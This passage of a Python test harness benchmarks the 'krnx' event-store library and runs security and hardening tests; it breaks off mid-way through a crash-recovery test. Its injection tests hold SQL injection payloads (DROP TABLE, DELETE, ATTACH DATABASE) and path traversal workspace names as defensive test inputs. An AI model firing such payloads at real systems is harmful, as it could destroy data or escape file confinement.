#!/usr/bin/env python3
"""
krnx Test Harness — Performance & Correctness Benchmarks

Produces legitimate numbers for the white paper.

Usage:
    python bench.py                    # Run all benchmarks
    python bench.py --perf             # Performance only
    python bench.py --correctness      # Correctness only
    python bench.py --output results/  # Custom output dir

Output:
    results/
    ├── benchmark_results.json    # Raw data
    ├── benchmark_summary.md      # Human readable
    └── plots/                    # Optional visualizations
"""

import os
import sys
import json
import time
import shutil
import argparse
import tempfile
import statistics
import threading
import multiprocessing
from pathlib import Path
from datetime import datetime
from dataclasses import dataclass, asdict
from typing import List, Dict, Any, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

# Add src to path
sys.path.insert(0, str(Path(__file__).parent / "src"))

import krnx
from krnx import Substrate, IntegrityError


# =============================================================================
# CONFIGURATION
# =============================================================================

@dataclass
class BenchConfig:
    """Benchmark configuration."""
    # Write throughput tests
    write_counts: List[int] = None
    
    # Read latency tests
    read_iterations: int = 1000
    
    # Branch tests
    branch_event_counts: List[int] = None
    
    # Verify tests
    verify_event_counts: List[int] = None
    
    # Search tests
    search_event_count: int = 10000
    search_iterations: int = 100
    
    # Concurrency tests
    concurrent_threads: List[int] = None
    concurrent_events_per_thread: int = 100
    
    # Correctness tests
    correctness_event_count: int = 1000
    
    # Soak test duration
    soak_duration_sec: int = 600  # 10 minutes
    
    def __post_init__(self):
        self.write_counts = self.write_counts or [100, 1000, 10000, 50000]
        self.branch_event_counts = self.branch_event_counts or [100, 1000, 10000]
        self.verify_event_counts = self.verify_event_counts or [100, 1000, 10000, 50000]
        self.concurrent_threads = self.concurrent_threads or [2, 4, 8, 16]


@dataclass
class BenchResult:
    """Single benchmark result."""
    name: str
    metric: str
    value: float
    unit: str
    params: Dict[str, Any] = None
    
    def __post_init__(self):
        self.params = self.params or {}


@dataclass 
class BenchReport:
    """Full benchmark report."""
    timestamp: str
    system_info: Dict[str, Any]
    config: Dict[str, Any]
    performance: List[Dict]
    correctness: List[Dict]
    security: List[Dict]
    hardening: List[Dict]
    summary: Dict[str, Any]


# =============================================================================
# UTILITIES
# =============================================================================

def get_system_info() -> Dict[str, Any]:
    """Get system information."""
    import platform
    return {
        "python_version": platform.python_version(),
        "platform": platform.platform(),
        "processor": platform.processor(),
        "cpu_count": multiprocessing.cpu_count(),
    }


def create_temp_substrate(name: str = "bench") -> tuple:
    """Create a substrate in a temp directory."""
    temp_dir = tempfile.mkdtemp(prefix="krnx_bench_")
    s = krnx.init(name, path=temp_dir)
    return s, temp_dir


def cleanup_temp(temp_dir: str):
    """Clean up temp directory."""
    shutil.rmtree(temp_dir, ignore_errors=True)


def percentile(data: List[float], p: float) -> float:
    """Calculate percentile."""
    if not data:
        return 0.0
    sorted_data = sorted(data)
    k = (len(sorted_data) - 1) * (p / 100)
    f = int(k)
    c = f + 1 if f + 1 < len(sorted_data) else f
    return sorted_data[f] + (k - f) * (sorted_data[c] - sorted_data[f])


def generate_content(i: int) -> Dict:
    """Generate test event content."""
    return {
        "index": i,
        "data": f"test_data_{i}",
        "value": i * 1.5,
        "tags": [f"tag_{i % 10}", f"category_{i % 5}"],
    }


# =============================================================================
# PERFORMANCE BENCHMARKS
# =============================================================================

class PerformanceBenchmarks:
    """Performance benchmark suite."""
    
    def __init__(self, config: BenchConfig):
        self.config = config
        self.results: List[BenchResult] = []
    
    def run_all(self) -> List[BenchResult]:
        """Run all performance benchmarks."""
        print("\n=== PERFORMANCE BENCHMARKS ===\n")
        
        self.bench_write_throughput()
        self.bench_read_latency()
        self.bench_branch_creation()
        self.bench_verify_time()
        self.bench_search_latency()
        self.bench_concurrent_writes()
        self.bench_disk_usage()
        
        return self.results
    
    def bench_write_throughput(self):
        """Measure write throughput at various scales."""
        print("Write throughput...")
        
        for count in self.config.write_counts:
            s, temp_dir = create_temp_substrate()
            
            start = time.perf_counter()
            for i in range(count):
                s.record("test", generate_content(i), agent=f"agent_{i % 4}")
            elapsed = time.perf_counter() - start
            
            throughput = count / elapsed
            
            self.results.append(BenchResult(
                name="write_throughput",
                metric="events_per_second",
                value=round(throughput, 2),
                unit="events/sec",
                params={"event_count": count, "elapsed_sec": round(elapsed, 3)}
            ))
            
            print(f"  {count:>6} events: {throughput:>10.2f} events/sec ({elapsed:.3f}s)")
            
            cleanup_temp(temp_dir)
    
    def bench_read_latency(self):
        """Measure read latency (log, show, at)."""
        print("Read latency...")
        
        s, temp_dir = create_temp_substrate()
        
        # Populate with 10k events
        event_ids = []
        for i in range(10000):
            eid = s.record("test", generate_content(i))
            event_ids.append(eid)
        
        # Benchmark log()
        latencies = []
        for _ in range(self.config.read_iterations):
            start = time.perf_counter()
            s.log(limit=100)
            latencies.append((time.perf_counter() - start) * 1000)  # ms
        
        self.results.append(BenchResult(
            name="read_latency_log",
            metric="p50_ms",
            value=round(percentile(latencies, 50), 3),
            unit="ms",
            params={"iterations": self.config.read_iterations, "limit": 100}
        ))
        self.results.append(BenchResult(
            name="read_latency_log",
            metric="p95_ms",
            value=round(percentile(latencies, 95), 3),
            unit="ms"
        ))
        self.results.append(BenchResult(
            name="read_latency_log",
            metric="p99_ms",
            value=round(percentile(latencies, 99), 3),
            unit="ms"
        ))
        
        print(f"  log():  p50={percentile(latencies, 50):.3f}ms  p95={percentile(latencies, 95):.3f}ms  p99={percentile(latencies, 99):.3f}ms")
        
        # Benchmark show()
        latencies = []
        for i in range(self.config.read_iterations):
            eid = event_ids[i % len(event_ids)]
            start = time.perf_counter()
            s.show(eid)
            latencies.append((time.perf_counter() - start) * 1000)
        
        self.results.append(BenchResult(
            name="read_latency_show",
            metric="p50_ms",
            value=round(percentile(latencies, 50), 3),
            unit="ms"
        ))
        self.results.append(BenchResult(
            name="read_latency_show",
            metric="p95_ms",
            value=round(percentile(latencies, 95), 3),
            unit="ms"
        ))
        
        print(f"  show(): p50={percentile(latencies, 50):.3f}ms  p95={percentile(latencies, 95):.3f}ms")
        
        # Benchmark at()
        latencies = []
        timestamps = [s.show(eid).ts for eid in event_ids[:100]]
        for i in range(self.config.read_iterations):
            ts = timestamps[i % len(timestamps)]
            start = time.perf_counter()
            s.at(ts)
            latencies.append((time.perf_counter() - start) * 1000)
        
        self.results.append(BenchResult(
            name="read_latency_at",
            metric="p50_ms",
            value=round(percentile(latencies, 50), 3),
            unit="ms"
        ))
        self.results.append(BenchResult(
            name="read_latency_at",
            metric="p95_ms",
            value=round(percentile(latencies, 95), 3),
            unit="ms"
        ))
        
        print(f"  at():   p50={percentile(latencies, 50):.3f}ms  p95={percentile(latencies, 95):.3f}ms")
        
        cleanup_temp(temp_dir)
    
    def bench_branch_creation(self):
        """Measure branch creation time."""
        print("Branch creation...")
        
        for count in self.config.branch_event_counts:
            s, temp_dir = create_temp_substrate()
            
            # Populate
            first_id = None
            for i in range(count):
                eid = s.record("test", generate_content(i))
                if i == 0:
                    first_id = eid
            
            # Time branch creation
            start = time.perf_counter()
            s.branch("test_branch", from_event=first_id)
            elapsed = time.perf_counter() - start
            
            self.results.append(BenchResult(
                name="branch_creation",
                metric="time_seconds",
                value=round(elapsed, 4),
                unit="sec",
                params={"event_count": count}
            ))
            
            print(f"  {count:>6} events: {elapsed:.4f}s")
            
            cleanup_temp(temp_dir)
    
    def bench_verify_time(self):
        """Measure verification time."""
        print("Verify time...")
        
        for count in self.config.verify_event_counts:
            s, temp_dir = create_temp_substrate()
            
            # Populate
            for i in range(count):
                s.record("test", generate_content(i))
            
            # Time verify
            start = time.perf_counter()
            s.verify()
            elapsed = time.perf_counter() - start
            
            rate = count / elapsed
            
            self.results.append(BenchResult(
                name="verify_time",
                metric="time_seconds",
                value=round(elapsed, 4),
                unit="sec",
                params={"event_count": count, "events_per_sec": round(rate, 2)}
            ))
            
            print(f"  {count:>6} events: {elapsed:.4f}s ({rate:.2f} events/sec)")
            
            cleanup_temp(temp_dir)
    
    def bench_search_latency(self):
        """Measure search latency."""
        print("Search latency...")
        
        s, temp_dir = create_temp_substrate()
        
        # Populate with varied content
        for i in range(self.config.search_event_count):
            content = generate_content(i)
            if i % 100 == 0:
                content["searchable"] = "needle_in_haystack"
            s.record("test", content)
        
        # Benchmark search
        latencies = []
        for _ in range(self.config.search_iterations):
            start = time.perf_counter()
            s.search("needle_in_haystack")
            latencies.append((time.perf_counter() - start) * 1000)
        
        self.results.append(BenchResult(
            name="search_latency",
            metric="p50_ms",
            value=round(percentile(latencies, 50), 3),
            unit="ms",
            params={"event_count": self.config.search_event_count}
        ))
        self.results.append(BenchResult(
            name="search_latency",
            metric="p95_ms",
            value=round(percentile(latencies, 95), 3),
            unit="ms"
        ))
        
        print(f"  {self.config.search_event_count} events: p50={percentile(latencies, 50):.3f}ms  p95={percentile(latencies, 95):.3f}ms")
        
        cleanup_temp(temp_dir)
    
    def bench_concurrent_writes(self):
        """Measure concurrent write performance."""
        print("Concurrent writes...")
        
        for num_threads in self.config.concurrent_threads:
            s, temp_dir = create_temp_substrate()
            events_per_thread = self.config.concurrent_events_per_thread
            total_events = num_threads * events_per_thread
            
            def writer(thread_id: int):
                for i in range(events_per_thread):
                    s.record("test", {"thread": thread_id, "index": i}, agent=f"thread_{thread_id}")
            
            start = time.perf_counter()
            with ThreadPoolExecutor(max_workers=num_threads) as executor:
                futures = [executor.submit(writer, t) for t in range(num_threads)]
                for f in as_completed(futures):
                    f.result()
            elapsed = time.perf_counter() - start
            
            throughput = total_events / elapsed
            
            # Verify integrity after concurrent writes
            try:
                s.verify()
                integrity = "PASS"
            except IntegrityError:
                integrity = "FAIL"
            
            self.results.append(BenchResult(
                name="concurrent_writes",
                metric="events_per_second",
                value=round(throughput, 2),
                unit="events/sec",
                params={
                    "threads": num_threads,
                    "events_per_thread": events_per_thread,
                    "total_events": total_events,
                    "integrity": integrity
                }
            ))
            
            print(f"  {num_threads:>2} threads: {throughput:>10.2f} events/sec (integrity: {integrity})")
            
            cleanup_temp(temp_dir)
    
    def bench_disk_usage(self):
        """Measure disk usage per event."""
        print("Disk usage...")
        
        s, temp_dir = create_temp_substrate()
        
        # Write events
        count = 10000
        for i in range(count):
            s.record("test", generate_content(i))
        
        # Measure db size
        db_path = Path(temp_dir) / "bench.db"
        db_size = db_path.stat().st_size
        bytes_per_event = db_size / count
        
        self.results.append(BenchResult(
            name="disk_usage",
            metric="bytes_per_event",
            value=round(bytes_per_event, 2),
            unit="bytes",
            params={"event_count": count, "total_bytes": db_size}
        ))
        
        print(f"  {count} events: {bytes_per_event:.2f} bytes/event ({db_size / 1024:.2f} KB total)")
        
        cleanup_temp(temp_dir)


# =============================================================================
# CORRECTNESS TESTS
# =============================================================================

class SecurityTests:
    """Security test suite — vulnerability and data leakage checks."""
    
    def __init__(self, config: BenchConfig):
        self.config = config
        self.results: List[Dict] = []
    
    def run_all(self) -> List[Dict]:
        """Run all security tests."""
        print("\n=== SECURITY TESTS ===\n")
        
        # Data leakage
        self.test_workspace_isolation()
        self.test_branch_data_isolation()
        self.test_deleted_branch_not_queryable()
        self.test_search_branch_isolation()
        
        # Injection attacks
        self.test_sql_injection_content()
        self.test_sql_injection_search()
        self.test_sql_injection_branch_name()
        self.test_path_traversal_workspace()
        
        # Content handling
        self.test_malformed_json_resilience()
        self.test_unicode_content()
        self.test_binary_content()
        self.test_large_content()
        
        # Integrity attacks
        self.test_hash_cannot_be_forged()
        self.test_parent_chain_tampering()
        self.test_replay_attack_detection()
        
        # Resource exhaustion
        self.test_large_event_count()
        self.test_many_branches()
        self.test_deep_content_nesting()
        
        return self.results
    
    def _record(self, name: str, passed: bool, details: str = ""):
        """Record test result."""
        status = "PASS" if passed else "FAIL"
        self.results.append({
            "name": name,
            "passed": passed,
            "status": status,
            "details": details,
            "category": "security"
        })
        symbol = "✓" if passed else "✗"
        print(f"  {symbol} {name}: {status}" + (f" ({details})" if details else ""))
    
    # =========================================================================
    # DATA LEAKAGE TESTS
    # =========================================================================
    
    def test_workspace_isolation(self):
        """Ensure data from workspace A cannot be accessed from workspace B."""
        temp_dir = tempfile.mkdtemp(prefix="krnx_sec_")
        
        try:
            # Create two workspaces with sensitive data
            s1 = krnx.init("workspace_a", path=temp_dir)
            s2 = krnx.init("workspace_b", path=temp_dir)
            
            secret_a = "SECRET_KEY_ALPHA_12345"
            secret_b = "SECRET_KEY_BETA_67890"
            
            s1.record("secret", {"api_key": secret_a, "workspace": "a"})
            s2.record("secret", {"api_key": secret_b, "workspace": "b"})
            
            # Try to access A's data from B
            events_b = s2.log(limit=1000)
            search_b = s2.search(secret_a)
            
            # Check for leakage
            leaked_in_log = any(secret_a in str(e.content) for e in events_b)
            leaked_in_search = len(search_b) > 0
            
            passed = not leaked_in_log and not leaked_in_search
            self._record("workspace_isolation", passed,
                        "no cross-workspace data access")
        except Exception as e:
            self._record("workspace_isolation", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_branch_data_isolation(self):
        """Ensure events on branch A don't appear in branch B queries."""
        s, temp_dir = create_temp_substrate()
        
        try:
            # Create base event
            base_id = s.record("base", {"common": True})
            
            # Create two branches
            s.branch("branch_a", from_event=base_id)
            s.branch("branch_b", from_event=base_id)
            
            # Add unique secrets to each branch
            secret_a = "BRANCH_A_SECRET_XYZ"
            secret_b = "BRANCH_B_SECRET_ABC"
            
            s.record("secret", {"key": secret_a}, branch="branch_a")
            s.record("secret", {"key": secret_b}, branch="branch_b")
            
            # Query branch_a, check for branch_b data
            events_a = s.log(limit=1000, branch="branch_a")
            search_in_a = s.search(secret_b, branch="branch_a")
            
            # Query branch_b, check for branch_a data
            events_b = s.log(limit=1000, branch="branch_b")
            search_in_b = s.search(secret_a, branch="branch_b")
            
            leaked_b_in_a = any(secret_b in str(e.content) for e in events_a)
            leaked_a_in_b = any(secret_a in str(e.content) for e in events_b)
            
            passed = (not leaked_b_in_a and not leaked_a_in_b and 
                     len(search_in_a) == 0 and len(search_in_b) == 0)
            self._record("branch_data_isolation", passed,
                        "branches contain only their own data")
        except Exception as e:
            self._record("branch_data_isolation", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_deleted_branch_not_queryable(self):
        """Ensure deleted branches don't appear in normal queries."""
        s, temp_dir = create_temp_substrate()
        
        try:
            base_id = s.record("base", {})
            s.branch("to_delete", from_event=base_id)
            
            secret = "DELETED_BRANCH_SECRET"
            s.record("secret", {"key": secret}, branch="to_delete")
            
            # Delete the branch
            s.branch_delete("to_delete")
            
            # Try to query deleted branch
            branches = s.branches(deleted=False)
            branch_names = [b["name"] for b in branches]
            
            # Try search on main (shouldn't find deleted branch data)
            search_main = s.search(secret, branch="main")
            
            passed = ("to_delete" not in branch_names and 
                     len(search_main) == 0)
            self._record("deleted_branch_not_queryable", passed,
                        "deleted branch hidden from normal queries")
        except Exception as e:
            self._record("deleted_branch_not_queryable", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_search_branch_isolation(self):
        """Ensure search is properly scoped to specified branch."""
        s, temp_dir = create_temp_substrate()
        
        try:
            # Add searchable content to main
            base_id = s.record("data", {"term": "common_base"})
            s.record("data", {"term": "findme_main_only"})
            
            # Create branch from base (before main-only event)
            s.branch("other", from_event=base_id)
            s.record("data", {"term": "findme_other_only"}, branch="other")
            
            # Search each branch for content that ONLY exists in that branch
            found_main_only = s.search("findme_main_only", branch="main")
            found_main_only_in_other = s.search("findme_main_only", branch="other")
            found_other_only = s.search("findme_other_only", branch="other")
            found_other_only_in_main = s.search("findme_other_only", branch="main")
            
            passed = (len(found_main_only) == 1 and 
                     len(found_other_only) == 1 and
                     len(found_main_only_in_other) == 0 and
                     len(found_other_only_in_main) == 0)
            self._record("search_branch_isolation", passed,
                        "search respects branch boundaries")
        except Exception as e:
            self._record("search_branch_isolation", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    # =========================================================================
    # INJECTION ATTACKS
    # =========================================================================
    
    def test_sql_injection_content(self):
        """Ensure SQL injection in event content is safely handled."""
        s, temp_dir = create_temp_substrate()
        
        try:
            # Various SQL injection payloads
            payloads = [
                "'; DROP TABLE events; --",
                "1; DELETE FROM events WHERE 1=1; --",
                "' OR '1'='1",
                "'); INSERT INTO events (event_id) VALUES ('hacked'); --",
                "' UNION SELECT * FROM events --",
                "1'; ATTACH DATABASE '/tmp/pwned.db' AS pwned; --",
            ]
            
            # Store payloads
            for i, payload in enumerate(payloads):
                s.record("injection_test", {
                    "user_input": payload,
                    "nested": {"evil": payload},
                    "index": i
                })
            
            # Verify database is intact
            s.verify()
            events = s.log(limit=100)
            
            # Check all events exist and were stored (payloads didn't execute)
            all_stored = len(events) == len(payloads)
            
            # Verify payloads are stored as data, not executed
            stored_payloads = [e.content["user_input"] for e in events]
            payloads_preserved = all(p in stored_payloads for p in payloads)
            
            passed = all_stored and payloads_preserved
            
            self._record("sql_injection_content", passed,
                        f"{len(payloads)} payloads stored safely")
        except Exception as e:
            self._record("sql_injection_content", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_sql_injection_search(self):
        """Ensure SQL injection in search queries is safely handled."""
        s, temp_dir = create_temp_substrate()
        
        try:
            # Add normal data
            s.record("data", {"value": "normal_searchable_content"})
            
            # Try SQL injection in search
            injection_queries = [
                "'; DROP TABLE events; --",
                "' OR '1'='1",
                "% OR 1=1 --",
                "'; DELETE FROM events; --",
            ]
            
            all_safe = True
            for query in injection_queries:
                try:
                    results = s.search(query)
                    # Should return empty or safe results, not crash
                except Exception:
                    all_safe = False
                    break
            
            # Verify database still intact
            s.verify()
            events = s.log()
            
            passed = all_safe and len(events) == 1
            self._record("sql_injection_search", passed,
                        "search handles injection attempts safely")
        except Exception as e:
            self._record("sql_injection_search", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_sql_injection_branch_name(self):
        """Ensure SQL injection in branch names is safely handled."""
        s, temp_dir = create_temp_substrate()
        
        try:
            s.record("base", {})
            
            # Try malicious branch names
            evil_names = [
                "'; DROP TABLE events; --",
                "branch' OR '1'='1",
                "test; DELETE FROM branches; --",
            ]
            
            all_safe = True
            for name in evil_names:
                try:
                    # This might raise an error, which is fine
                    s.branch(name)
                except Exception:
                    pass  # Expected - invalid name
            
            # Verify database intact
            s.verify()
            
            self._record("sql_injection_branch_name", True,
                        "branch names sanitized")
        except Exception as e:
            self._record("sql_injection_branch_name", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_path_traversal_workspace(self):
        """Ensure workspace names can't escape storage directory."""
        temp_dir = tempfile.mkdtemp(prefix="krnx_sec_")
        
        try:
            # Try path traversal in workspace name
            evil_names = [
                "../../../tmp/escape",
                "..\\..\\tmp\\escape",
                "workspace/../../escape",
                "normal/../../../tmp/escape",
            ]
            
            all_safe = True
            for name in evil_names:
                try:
                    s = krnx.init(name, path=temp_dir)
                    # Check that db is actually contained within temp_dir
                    db_path = os.path.realpath(s.db_path)
                    temp_path = os.path.realpath(temp_dir)
                    
                    # Database should be inside temp_dir
                    if not db_path.startswith(temp_path):
                        all_safe = False
                        break
                except Exception:
                    pass  # May reject invalid name - that's fine
            
            # Also verify no files were created outside temp_dir
            # by checking if the escape paths exist
            escape_created = (
                os.path.exists("/tmp/escape.db") or
                os.path.exists(os.path.expanduser("~/escape.db"))
            )
            
            passed = all_safe and not escape_created
            self._record("path_traversal_workspace", passed,
                        "workspace confined to storage dir")
        except Exception as e:
            self._record("path_traversal_workspace", False, str(e))
        finally:
            cleanup_temp(temp_dir)
            # Cleanup any escaped files
            for p in ["/tmp/escape.db", os.path.expanduser("~/escape.db")]:
                if os.path.exists(p):
                    os.remove(p)
    
    # =========================================================================
    # CONTENT HANDLING
    # =========================================================================
    
    def test_malformed_json_resilience(self):
        """Ensure system handles edge-case content gracefully."""
        s, temp_dir = create_temp_substrate()
        
        try:
            edge_cases = [
                {},  # Empty
                {"key": None},  # Null value
                {"key": ""},  # Empty string
                {"a": {"b": {"c": {"d": {"e": "deep"}}}}},  # Deep nesting
                {"list": [1, 2, 3, None, "mixed", {"nested": True}]},  # Mixed list
                {"unicode": "émoji: 🔥🎉"},  # Unicode
                {"special": "tab\ttab\nnewline"},  # Whitespace chars
            ]
            
            for content in edge_cases:
                s.record("edge_case", content)
            
            s.verify()
            events = s.log(limit=100)
            
            passed = len(events) == len(edge_cases)
            self._record("malformed_json_resilience", passed,
                        f"{len(edge_cases)} edge cases handled")
        except Exception as e:
            self._record("malformed_json_resilience", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_unicode_content(self):
        """Ensure Unicode content is properly stored and retrieved."""
        s, temp_dir = create_temp_substrate()
        
        try:
            unicode_samples = [
                "English",
                "日本語",
                "العربية",
                "עברית",
                "中文",
                "🔐🛡️🔒",  # Security emojis
                "Ω≈ç√∫≤≥÷",
                "\u0000\u0001\u0002",  # Control chars
            ]
            
            for sample in unicode_samples:
                s.record("unicode", {"text": sample})
            
            events = s.log(limit=100)
            
            # Verify round-trip
            stored = [e.content["text"] for e in reversed(events)]
            passed = stored == unicode_samples
            
            self._record("unicode_content", passed,
                        f"{len(unicode_samples)} unicode samples preserved")
        except Exception as e:
            self._record("unicode_content", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_binary_content(self):
        """Ensure binary-like content doesn't corrupt storage."""
        s, temp_dir = create_temp_substrate()
        
        try:
            import base64
            
            # Simulate binary data as base64
            binary_samples = [
                base64.b64encode(bytes(range(256))).decode(),
                base64.b64encode(b"\x00" * 100).decode(),
                base64.b64encode(b"\xff" * 100).decode(),
            ]
            
            for sample in binary_samples:
                s.record("binary", {"data": sample})
            
            s.verify()
            events = s.log(limit=100)
            
            # Verify round-trip
            stored = [e.content["data"] for e in reversed(events)]
            passed = stored == binary_samples
            
            self._record("binary_content", passed,
                        "binary data preserved via base64")
        except Exception as e:
            self._record("binary_content", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_large_content(self):
        """Ensure large content doesn't cause issues."""
        s, temp_dir = create_temp_substrate()
        
        try:
            # 1MB of text
            large_text = "x" * (1024 * 1024)
            s.record("large", {"data": large_text})
            
            # 10KB nested structure
            nested = {"level": 0}
            current = nested
            for i in range(100):
                current["nested"] = {"level": i + 1, "data": "x" * 100}
                current = current["nested"]
            s.record("nested", nested)
            
            s.verify()
            events = s.log(limit=10)
            
            # Verify retrieval
            large_event = next(e for e in events if e.type == "large")
            passed = len(large_event.content["data"]) == 1024 * 1024
            
            self._record("large_content", passed,
                        "1MB content stored and retrieved")
        except Exception as e:
            self._record("large_content", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    # =========================================================================
    # INTEGRITY ATTACKS
    # =========================================================================
    
    def test_hash_cannot_be_forged(self):
        """Ensure changing content invalidates hash verification."""
        s, temp_dir = create_temp_substrate()
        
        try:
            # Create chain
            for i in range(5):
                s.record("data", {"index": i, "secret": f"secret_{i}"})
            
            # Tamper with content via direct DB access
            import sqlite3
            conn = sqlite3.connect(str(Path(temp_dir) / "bench.db"))
            conn.execute(
                "UPDATE events SET content = '{\"index\": 2, \"secret\": \"FORGED\"}' WHERE id = 3"
            )
            conn.commit()
            conn.close()
            
            # Verify should detect forgery
            s2 = krnx.init("bench", path=temp_dir)
            
            forgery_detected = False
            try:
                s2.verify()
            except IntegrityError:
                forgery_detected = True
            
            self._record("hash_cannot_be_forged", forgery_detected,
                        "content tampering detected")
        except Exception as e:
            self._record("hash_cannot_be_forged", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_parent_chain_tampering(self):
        """Ensure tampering with parent hashes is detected."""
        s, temp_dir = create_temp_substrate()
        
        try:
            for i in range(5):
                s.record("data", {"index": i})
            
            # Tamper with parent_hash
            import sqlite3
            conn = sqlite3.connect(str(Path(temp_dir) / "bench.db"))
            conn.execute(
                "UPDATE events SET parent_hash = 'fakehash12345678' WHERE id = 3"
            )
            conn.commit()
            conn.close()
            
            s2 = krnx.init("bench", path=temp_dir)
            
            tampering_detected = False
            try:
                s2.verify()
            except IntegrityError:
                tampering_detected = True
            
            self._record("parent_chain_tampering", tampering_detected,
                        "parent hash tampering detected")
        except Exception as e:
            self._record("parent_chain_tampering", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_replay_attack_detection(self):
        """Ensure duplicating events is detected."""
        s, temp_dir = create_temp_substrate()
        
        try:
            for i in range(5):
                s.record("data", {"index": i})
            
            # Duplicate an event via direct DB access
            import sqlite3
            conn = sqlite3.connect(str(Path(temp_dir) / "bench.db"))
            conn.execute("""
                INSERT INTO events (event_id, event_type, agent, content, ts, branch, parent_hash, hash)
                SELECT 'evt_duplicate', event_type, agent, content, ts, branch, parent_hash, hash
                FROM events WHERE id = 3
            """)
            conn.commit()
            conn.close()
            
            s2 = krnx.init("bench", path=temp_dir)
            
            # Chain should be broken because duplicate has wrong parent
            replay_detected = False
            try:
                s2.verify()
            except IntegrityError:
                replay_detected = True
            
            self._record("replay_attack_detection", replay_detected,
                        "event replay/duplication detected")
        except Exception as e:
            self._record("replay_attack_detection", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    # =========================================================================
    # RESOURCE EXHAUSTION
    # =========================================================================
    
    def test_large_event_count(self):
        """Ensure system handles large event counts."""
        s, temp_dir = create_temp_substrate()
        
        try:
            # Write 10k events
            count = 10000
            for i in range(count):
                s.record("stress", {"index": i})
            
            s.verify()
            actual_count = s.count()
            
            passed = actual_count == count
            self._record("large_event_count", passed,
                        f"{count} events handled")
        except Exception as e:
            self._record("large_event_count", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_many_branches(self):
        """Ensure system handles many branches."""
        s, temp_dir = create_temp_substrate()
        
        try:
            base_id = s.record("base", {})
            
            # Create 100 branches
            branch_count = 100
            for i in range(branch_count):
                s.branch(f"branch_{i}", from_event=base_id)
                s.record("data", {"branch": i}, branch=f"branch_{i}")
            
            branches = s.branches()
            
            # Verify each branch
            all_valid = True
            for b in branches[:10]:  # Sample check
                try:
                    s.verify(b["name"])
                except:
                    all_valid = False
                    break
            
            passed = len(branches) == branch_count + 1 and all_valid  # +1 for main
            self._record("many_branches", passed,
                        f"{branch_count} branches handled")
        except Exception as e:
            self._record("many_branches", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_deep_content_nesting(self):
        """Ensure deeply nested content doesn't cause issues."""
        s, temp_dir = create_temp_substrate()
        
        try:
            # Create deeply nested structure
            depth = 50
            content = {"level": 0}
            current = content
            for i in range(depth):
                current["nested"] = {"level": i + 1}
                current = current["nested"]
            current["end"] = "bottom"
            
            s.record("deep", content)
            s.verify()
            
            event = s.log(limit=1)[0]
            
            # Traverse to verify
            current = event.content
            for i in range(depth):
                current = current["nested"]
            
            passed = current.get("end") == "bottom"
            self._record("deep_content_nesting", passed,
                        f"{depth} levels nested")
        except Exception as e:
            self._record("deep_content_nesting", False, str(e))
        finally:
            cleanup_temp(temp_dir)


class HardeningTests:
    """Production hardening tests — crash recovery, soak, fuzzing."""
    
    def __init__(self, config: BenchConfig):
        self.config = config
        self.results: List[Dict] = []
    
    def run_all(self) -> List[Dict]:
        """Run all hardening tests."""
        print("\n=== HARDENING TESTS ===\n")
        
        # Crash recovery
        self.test_crash_recovery_mid_write()
        self.test_crash_recovery_mid_batch()
        self.test_recovery_after_wal_checkpoint()
        
        # Soak testing
        self.test_soak_sustained_writes()
        self.test_soak_memory_stability()
        
        # Fuzzing
        self.test_fuzz_event_types()
        self.test_fuzz_content_structure()
        self.test_fuzz_agent_names()
        self.test_fuzz_branch_operations()
        self.test_fuzz_timestamps()
        self.test_fuzz_rapid_branch_switching()
        
        return self.results
    
    def _record(self, name: str, passed: bool, details: str = ""):
        """Record test result."""
        status = "PASS" if passed else "FAIL"
        self.results.append({
            "name": name,
            "passed": passed,
            "status": status,
            "details": details,
            "category": "hardening"
        })
        symbol = "✓" if passed else "✗"
        print(f"  {symbol} {name}: {status}" + (f" ({details})" if details else ""))
    
    # =========================================================================
    # CRASH RECOVERY
    # =========================================================================
    
    def test_crash_recovery_mid_write(self):
        """Simulate crash during write, verify recovery."""
        import subprocess
        
        temp_dir = tempfile.mkdtemp(prefix="krnx_crash_")
        
        try:
            # Write a script that writes events and "crashes"
            script = f'''
import sys
sys.path.insert(0, "src")
import krnx
import time

s = krnx.init("crash_test", path="{temp_dir}")

# Write some events
for i in range(100):
    s.record("pre_crash", {{"index": i}})

# Simulate "crash" - exit without clean shutdown
import os
os._exit(1)
'''
            script_path = Path(temp_dir) / "crash_script.py"
            script_path.write_text(script)
            
            # Run the script using same Python interpreter
            result = subprocess.run(
                [sys.executable, str(script_path)],
                cwd=str(Path(__file__).parent),
                capture_output=True,
                timeout=30
            )
            
            # Now try to recover
            s = krnx.init("crash_test", path=temp_dir)
            
            # Should be able to read existing events
            events = s.log(limit=1000)
            
            # Should be able to verify (WAL should be recovered)
            try:
                s.verify()
                verify_ok = True
            except:
                verify_ok = False
            
            # Should be able to write new events
            new_id = s.record("post_crash", {"recovered": True})
            write_ok = new_id is not None
            
            passed = len(events) > 0 and verify_ok and write_ok
            self._record("crash_recovery_mid_write", passed,
                        f"recovered {len(events)} events, verify={verify_ok}")
        except Exception as e:
            self._record("crash_recovery_mid_write", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_crash_recovery_mid_batch(self):
        """Simulate crash during batch write, verify partial recovery."""
        temp_dir = tempfile.mkdtemp(prefix="krnx_crash_")
        
        try:
            # Write initial events
            s = krnx.init("batch_crash", path=temp_dir)
            for i in range(50):
                s.record("initial", {"index": i})
            
            initial_count = s.count()
            s.close()
            
            # Simulate partial write by directly manipulating DB
            # (simulating what happens if process dies mid-transaction)
            import sqlite3
            db_path = Path(temp_dir) / "batch_crash.db"
            
            conn = sqlite3.connect(str(db_path))
            # Start transaction but don't commit (simulating crash)
            conn.execute("BEGIN")
            conn.execute("""
